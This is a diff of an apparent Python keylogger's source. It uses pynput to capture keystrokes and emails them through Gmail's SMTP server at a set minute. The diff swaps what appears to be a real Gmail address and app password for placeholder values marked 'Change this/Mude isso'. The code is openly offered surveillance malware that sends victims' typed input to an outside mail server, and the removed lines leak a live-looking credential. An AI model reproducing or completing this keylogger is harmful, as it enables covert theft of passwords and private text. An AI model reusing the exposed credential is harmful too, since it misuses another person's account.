@@ -1,10 +1,7 @@
 from pynput import keyboard
 import smtplib, ssl
 from datetime import datetime
-
 data = ""
-
-
 def on_release(key):
     global data
     try:
@@ -20,9 +17,12 @@ while True:
     smtp_server    = "smtp.gmail.com"
     port           = 587 
     time           = 12
-    sender_email   = "sakakibarav5555@gmail.com"
-    password       = "zcph gupb aogo zgub "
-    receiver_email = "sakakibarav5555@gmail.com"
+    #Change this/Mude isso
+    sender_email   = "sender@gmail.com"
+    #Change this/Mude isso
+    password       = "xxxxxxxxxxxxx"
+    #Change this/Mude isso
+    receiver_email = "receiver@gmail.com"
     context        = ssl.create_default_context()
     if datetime.now().minute == time:
         if  enviou == False:         
